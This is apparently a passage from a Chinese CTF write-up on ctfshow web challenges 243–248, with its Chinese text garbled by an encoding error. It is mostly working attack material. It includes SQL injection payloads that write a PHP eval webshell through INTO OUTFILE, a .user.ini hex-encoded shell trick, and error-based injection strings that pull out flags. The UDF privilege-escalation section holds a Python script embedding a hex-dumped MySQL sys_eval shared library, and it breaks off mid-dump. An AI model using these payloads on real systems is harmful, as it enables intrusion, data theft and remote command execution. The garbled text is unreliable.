'char']    ]    [LINES        [STARTING BY 'string']        [TERMINATED BY 'string']    ]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-mysql"><code class="language-mysql">â€œOPTIONâ€å‚æ•°ä¸ºå¯é€‰å‚æ•°é€‰é¡¹ï¼Œå…¶å¯èƒ½çš„å–å€¼æœ‰ï¼š`FIELDS TERMINATED BY 'å­—ç¬¦ä¸²'`ï¼šè®¾ç½®å­—ç¬¦ä¸²ä¸ºå­—æ®µä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼æ˜¯â€œ\tâ€ã€‚`FIELDS ENCLOSED BY 'å­—ç¬¦'`ï¼šè®¾ç½®å­—ç¬¦æ¥æ‹¬ä½å­—æ®µçš„å€¼ï¼Œåªèƒ½ä¸ºå•ä¸ªå­—ç¬¦ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•ç¬¦å·ã€‚`FIELDS OPTIONALLY ENCLOSED BY 'å­—ç¬¦'`ï¼šè®¾ç½®å­—ç¬¦æ¥æ‹¬ä½CHARã€VARCHARå’ŒTEXTç­‰å­—ç¬¦å‹å­—æ®µã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•ç¬¦å·ã€‚`FIELDS ESCAPED BY 'å­—ç¬¦'`ï¼šè®¾ç½®è½¬ä¹‰å­—ç¬¦ï¼Œåªèƒ½ä¸ºå•ä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼ä¸ºâ€œ\â€ã€‚`LINES STARTING BY 'å­—ç¬¦ä¸²'`ï¼šè®¾ç½®æ¯è¡Œæ•°æ®å¼€å¤´çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•å­—ç¬¦ã€‚`LINES TERMINATED BY 'å­—ç¬¦ä¸²'`ï¼šè®¾ç½®æ¯è¡Œæ•°æ®ç»“å°¾çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼æ˜¯â€œ\nâ€ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>å¯ä»¥å†™é©¬çš„å‚æ•°æœ‰ï¼š</strong></p><p><code>FIELDS TERMINATED BY</code>ã€ <code>LINES STARTING BY</code>ã€ <code>LINES TERMINATED BY</code></p><p>åœ¨url/api/dump.phpä¸‹å†™é©¬</p><p>é©¬åœ¨url/dump/1.php</p><pre class="line-numbers language-mysql"><code class="language-mysql">filename=1.php' LINES STARTING BY "<?php eval($_POST[1]);?>";#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‘½ä»¤è¡Œåˆ°æ ¹ç›®å½•è¾“å…¥</p><p><code>find / -name &quot;f*&quot; | xargs grep &quot;ctfshow&quot;</code></p><h1 id="web243"><a href="#web243" class="headerlink" title="web243"></a>web243</h1><p><strong>sqlè¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//å¤‡ä»½è¡¨</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>è¿”å›é€»è¾‘</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//è¿‡æ»¤äº†php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>åœ¨ä¸Šä¸€é¢˜ç›®çš„payloadä¸­æ˜¯éœ€è¦phpå­—æ®µçš„ï¼Œè¿™é‡Œç»™å–æ¶ˆæ‰äº†ï¼Œä¹Ÿä¸çŸ¥é“phtmlå¥½ä¸å¥½ç”¨ï¼Œä½†æ˜¯æœ¬åœ°é‡è¦è€ƒç‚¹åœ¨äº<code>.user.ini:auto_append_file=1.pngæˆ–è€…auto_prepend_file=1.png</code></p><p><strong>å†ç†Ÿæ‚‰ä¸€éä¸Šä¸€é¢˜çš„å‚æ•°ï¼š</strong></p><p><code>FIELDS TERMINATED BY</code>ï¼šè®¾ç½®å­—ç¬¦ä¸²ä¸ºå­—æ®µä¹‹é—´çš„åˆ†éš”ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼æ˜¯â€œ\tâ€ã€‚</p><p><code>LINES STARTING BY &#39;å­—ç¬¦ä¸²&#39;</code>ï¼šè®¾ç½®æ¯è¡Œæ•°æ®å¼€å¤´çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä½¿ç”¨ä»»ä½•å­—ç¬¦ã€‚</p><p><code>LINES TERMINATED BY &#39;å­—ç¬¦ä¸²&#39;</code>ï¼šè®¾ç½®æ¯è¡Œæ•°æ®ç»“å°¾çš„å­—ç¬¦ï¼Œå¯ä»¥ä¸ºå•ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚é»˜è®¤å€¼æ˜¯â€œ\nâ€ã€‚</p><p><strong>payloadï¼š</strong></p><p>å…ˆä¸Šiniï¼š</p><pre class="line-numbers language-mysql"><code class="language-mysql">filename=.user.ini' LINES STARTING BY ';' TERMINATED BY 0x0a6175746f5f70726570656e645f66696c653d312e706e670a;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ³¨æ„16è¿›åˆ¶æ˜¯ä¸ºäº†0a(æ¢è¡Œ)å‘æŒ¥ä½œç”¨ï¼Œè€Œstarting by â€œ;â€ï¼Œæ˜¯æƒ³è®©æ¯è¡Œæ•°æ®çš„å¼€å¤´å­—ç¬¦éƒ½æ˜¯åˆ†å·ï¼Œæ˜¯ä¸ºäº†è®©å‰é¢çš„é‚£ä¸ª<code>select * from ctfshow_user</code>æŸ¥å‡ºæ¥çš„ä¸œè¥¿ä¸åé¢çš„åšä¸ªäº†æ–­</p><p>å†ä¸ŠpngğŸ´ï¼š</p><pre class="line-numbers language-mysql"><code class="language-mysql">filename=1.png' LINES TERMINATED BY 0x3c3f706870206576616c28245f504f53545b315d293b3f3e;#<?php eval($_POST[1]);?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿æ¥æ—¶å€™æ³¨æ„æ˜¯/dump/index.php</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210822200724800.png" alt="image-20210822200724800"></p><h1 id="web244ã€245â€”â€”æŠ¥é”™æ³¨å…¥"><a href="#web244ã€245â€”â€”æŠ¥é”™æ³¨å…¥" class="headerlink" title="web244ã€245â€”â€”æŠ¥é”™æ³¨å…¥"></a>web244ã€245â€”â€”æŠ¥é”™æ³¨å…¥</h1><p><strong>sqlè¯­å¥</strong></p><pre class="line-numbers language-php"><code class="language-php">  <span class="token comment" spellcheck="true">//å¤‡ä»½è¡¨</span>  <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>æŠ¥é”™æ³¨å…¥çš„ä¸¤ç§å½¢å¼ï¼š</strong></p><pre><code>extractvalue(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„):å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°updatexml(ç›®æ ‡xmlæ–‡æ¡£ï¼Œxmlè·¯å¾„ï¼Œæ›´æ–°çš„å†…å®¹):æ›´æ–°xmlæ–‡æ¡£çš„å‡½æ•°å…¶éƒ½æ˜¯é’ˆå¯¹xmlè·¯å¾„è¿›è¡Œçš„æ³¨å…¥</code></pre><p><strong>payloadï¼š</strong></p><pre class="line-numbers language-mysql"><code class="language-mysql">updatexml:?id=1' or updatexml(1,concat(0x7e,database(),0x7e),1)+--+?id=1' or updatexml(1,concat(0x7e,substr((select group_concat(flag) from ctfshow_flag),1,32),0x7e),1)+--+?id=1' or updatexml(1,concat(0x7e,(select left(flag,32) from ctfshow_flag),0x7e),1)+--+?id=1' or updatexml(1,concat(0x7e,(select right(flag,32) from ctfshow_flag),0x7e),1)+--+extractvalue:?id=1' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))+--+?id=1' or extractvalue(1,concat(0x7e,substr((select group_concat(flag1) from ctfshow_flagsa),20,30),0x7e))+--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="web246â€”â€”flooræŠ¥é”™æ³¨å…¥"><a href="#web246â€”â€”flooræŠ¥é”™æ³¨å…¥" class="headerlink" title="web246â€”â€”flooræŠ¥é”™æ³¨å…¥"></a>web246â€”â€”flooræŠ¥é”™æ³¨å…¥</h1><p><strong>flooræŠ¥é”™æ³¨å…¥ï¼š</strong>ä¸»è¦åˆ©ç”¨ä¸»é”®çš„é‡å¤æ¥å®ç°æŠ¥é”™</p><pre><code>?id=1&#39; union select 1,count(*),concat(0x7e,database(),0x7e,floor(rand(0)*2))b from information_schema.tables group by b-- -?id=1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1), 0x7e,floor(rand(0)*2))b from information_schema.tables group by b -- -?id=1&#39; union select 1,count(*),concat(0x7e,(select flag2 from ctfshow_flags),0x7e,floor(rand(0)*2))b from information_schema.tables group by b-- -</code></pre><h1 id="web247â€”â€”åŒæŸ¥è¯¢é”™è¯¯æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥"><a href="#web247â€”â€”åŒæŸ¥è¯¢é”™è¯¯æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥" class="headerlink" title="web247â€”â€”åŒæŸ¥è¯¢é”™è¯¯æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥"></a>web247â€”â€”åŒæŸ¥è¯¢é”™è¯¯æ³¨å…¥ã€æŠ¥é”™æ³¨å…¥</h1><p><strong><code>floor()ï¼šå‘ä¸‹å–æ•´</code><br><code>ceil()ï¼šå‘ä¸Šå–æ•´</code><br><code>round()ï¼šå››èˆäº”å…¥</code></strong></p><p><strong>flooræ›¿æ¢æˆå…¶ä»–å–æ•´å‡½æ•°å³å¯</strong></p><pre><code>?id=1&#39; union select 1,count(*),concat((select `flag?` from ctfshow_flagsa ), 0x7e,round(rand(0)*2))b from information_schema.tables group by b -- -</code></pre><h1 id="web248â€”â€”UDFæ³¨å…¥"><a href="#web248â€”â€”UDFæ³¨å…¥" class="headerlink" title="web248â€”â€”UDFæ³¨å…¥"></a>web248â€”â€”UDFæ³¨å…¥</h1><p><strong>udfï¼šç”¨æˆ·è‡ªå®šä¹‰çš„å‡½æ•°</strong></p><pre><code>/api/?id=1&#39;; select @@plugin_dir; -- -æŸ¥å‡ºMysqlæ’ä»¶è·¯å¾„ï¼š/usr/lib/mariadb/plugin//api/?id=&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;--+å¼•å…¥udf.soæ–‡ä»¶ä»è€Œåˆ›å»ºå‡½æ•°sys_eval</code></pre><p><strong>expææƒï¼š</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsbase_url<span class="token operator">=</span><span class="token string">"http://3f801e10-5c58-42bf-a5cf-8a588d3bfe9c.challenge.ctf.show:8080/api/"</span>payload <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>text <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"d"</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">]</span>udf <span class="token operator">=</span> <span class="token string">"7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8BA2B0000004889CE4889C7E87EFAFFFFB801000000C9C3554889E548897DF8C9C3554889E54881EC500400004889BDD8FBFFFF4889B5D0FBFFFF488995C8FBFFFF48898DC0FBFFFF4C8985B8FBFFFF4C898DB0FBFFFFBF01000000E8BEF9FFFF488985C8FBFFFF48C745F000000000488B85D0FBFFFF488B4010488B00488D352C0200004889C7E852FAFFFF488945E8EB63488D85E0FBFFFF4889C7E8BDF9FFFF488945F8488B45F8488B55F04801C2488B85C8FBFFFF4889D64889C7E80CFAFFFF488985C8FBFFFF488D85E0FBFFFF488B55F0488B8DC8FBFFFF4801D1488B55F84889C64889CFE8D1F9FFFF488B45F8480145F0488B55E8488D85E0FBFFFFBE000400004889C7E831F9FFFF4885C07580488B45E84889C7E850F9FFFF488B85C8FBFFFF0FB60084C0740A4883BDC8FBFFFF00750C488B85B8FBFFFFC60001EB2B488B45F0488B95C8FBFFFF488D0402C60000488B85C8FBFFFF4889C7E8FBF8FFFF488B95C0FBFFFF488902488B85C8FBFFFFC9C39090909090909090554889E5534883EC08488B05A80320004883F8FF7419488D1D9B0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E84FF9FFFF4883C408C300004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F29000000000000006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E33000045787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D6574657200000000000045787065637465642065786163746C792074776F20617267756D656E74730000457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279007200011B033B800000000F00000008F9FFFF9C00000051F9FFFFBC0000005BF9FFFFDC000000A7F9FFFFFC00000004FAFFFF1C0100000EFAFFFF3C01000071FAFFFF5C01000062FBFFFF7C0100008DFBFFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C0000000000000